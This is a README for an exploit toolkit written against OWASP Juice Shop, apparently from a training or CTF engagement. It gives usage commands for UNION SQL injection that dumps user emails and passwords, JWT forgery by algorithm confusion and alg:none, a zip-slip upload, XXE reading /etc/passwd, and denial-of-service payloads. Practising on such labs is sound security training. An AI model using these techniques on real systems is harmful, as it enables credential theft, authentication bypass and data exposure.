# Tools
 
[![Python 3](https://img.shields.io/badge/Python-3-blue.svg)](#)
[![Node >= 18](https://img.shields.io/badge/Node-%3E%3D18-green.svg)](#)
[![Payloads Included](https://img.shields.io/badge/Payloads-5%20files-yellow.svg)](#payload-files-payloads)

Reusable exploit scripts & payloads derived from the engagement. Dependency
policy: Python 3 stdlib + `requests`; Node ≥ 18 (global `fetch`) for the coding
solver. Everything is parameterized so it replays against any Juice Shop
deployment.

All HTTP examples assume a `BASE_URL` (app origin) and, where the request must
be proxied (MultiJuicer), a proxy cookie. Live values are `<redacted>` in this
repo.

| Tool | Purpose |
| :--- | :--- |
| [`union_sqli.py`](./union_sqli.py) | Arbitrary UNION SQL execution against the product-search injection |
| [`jwt_forge.py`](./jwt_forge.py) | Forge JWTs: algorithm confusion, `alg:none`, plain HS256 |
| [`socketio_client.py`](./socketio_client.py) | Raw Socket.IO polling client (no library) for verifier events |
| [`coding_challenge_solver.mjs`](./coding_challenge_solver.mjs) | Solve all find-it/fix-it coding challenges from a pinned source tree |
| [`security_answer_hmac.py`](./security_answer_hmac.py) | Verify/reset security-answer HMACs |
| [`make_zip_slip.py`](./make_zip_slip.py) | Build a zip-slip archive |
| [`payloads/`](./payloads) | XXE, XXE-DoS, YAML alias-bomb, B2B RCE-DoS payload files |

---

## `union_sqli.py` - SQL injection executor

The search endpoint builds raw SQL with the term interpolated into the
`WHERE`. Unioning with 9 columns exposes anything reachable in the SQLite DB.

```bash
# Dump the full schema
python3 union_sqli.py --base "$BASE_URL" --cookie "$PROXY" schema

# Arbitrary UNION query (pad to 9 columns; integers fill the rest)
python3 union_sqli.py --base "$BASE_URL" --cookie "$PROXY" query \
  --select "id,email,password" --from "Users" --where "id=1"
```

## `jwt_forge.py` - Token forgery

```bash
# HS256 signed with the RSA public-key file bytes (algorithm confusion)
python3 jwt_forge.py confuse --pub jwt.pub --email rsa_lord@juice-sh.op

# Unsigned (alg:none)
python3 jwt_forge.py none --email jwtn3d@juice-sh.op

# Plain HS256 with an explicit secret
python3 jwt_forge.py hs256 --secret "$JWT_SECRET" --email admin@juice-sh.op
```

## `socketio_client.py` - Raw Socket.IO events

```bash
# Emit a verifier event (e.g. Mass Dispel / SVG injection)
python3 socketio_client.py --base "$BASE_URL" --cookie "$PROXY" \
  emit --event verifyCloseNotificationsChallenge \
  --data '["close","close"]'

# Listen for a short while (polling transport)
python3 socketio_client.py --base "$BASE_URL" --cookie "$PROXY" listen --seconds 10
```

## `coding_challenge_solver.mjs` - All 70 coding challenges

Needs a checkout of the pinned Juice Shop source tree (default
`./juice-shop`) whose `// vuln-code-snippet` markers are parsed to recompute
`vulnLines` per key (identical logic to `lib/codingChallenges.ts`).

```bash
node coding_challenge_solver.mjs --base "$BASE_URL" --source ./juice-shop
# dry run prints the computed key -> vulnLines table without posting
node coding_challenge_solver.mjs --source ./juice-shop --dry-run
```

## `security_answer_hmac.py`

```bash
# Print the stored-answer HMAC for an answer (compare with the DB dump)
python3 security_answer_hmac.py "Samuel"
```

## `make_zip_slip.py`

```bash
# Creates slip.zip containing ../../ftp/legal.md
python3 make_zip_slip.py slip.zip ../../ftp/legal.md "overwritten"
curl -X POST "$BASE_URL/file-upload" -F "file=@slip.zip"
```

## Payload files (`payloads/`)

| File | Technique | Result |
| :--- | :--- | :--- |
| `xxe_read.xml` | `file:///etc/passwd` external entity | file content echoed in 410 |
| `xxe_dos.xml` | blocking read of `file:///dev/random` | parse stalls → 503 (XXE DoS) |
| `yaml_alias_bomb.yml` | exponential alias expansion | graceful 503 (Memory Bomb) |
| `b2b_infinite_loop.json` | `orderLinesData:"while(true){}"` | `Infinite loop detected` (Blocked RCE DoS) |
| `b2b_regex_timeout.json` | catastrophic regex backtracking | `503 Script execution timed out` (Successful RCE DoS) |
